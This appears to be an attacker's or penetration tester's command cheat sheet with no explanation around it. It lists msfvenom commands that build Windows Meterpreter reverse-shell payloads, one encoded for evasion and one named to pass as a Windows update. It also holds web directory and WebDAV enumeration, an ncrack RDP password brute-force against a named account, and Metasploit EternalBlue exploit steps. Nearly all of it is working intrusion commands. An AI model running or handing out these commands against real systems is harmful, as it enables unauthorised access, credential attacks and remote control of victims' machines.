msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

gobuster dir -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/iis-urls.txt -t 50 -x aspx,asp,html,htm

gobuster dir -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x aspx,asp,html,htm


nmap -p 80 --script=http-webdav-scan <ip>


davtest -url http://<ip>


ncrack -v -p 3389 -U <(echo rsilva) -P wordlist_pro.txt 192.168.1.84

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.101
exploit
set PAYLOAD windows/meterpreter/reverse_tcp

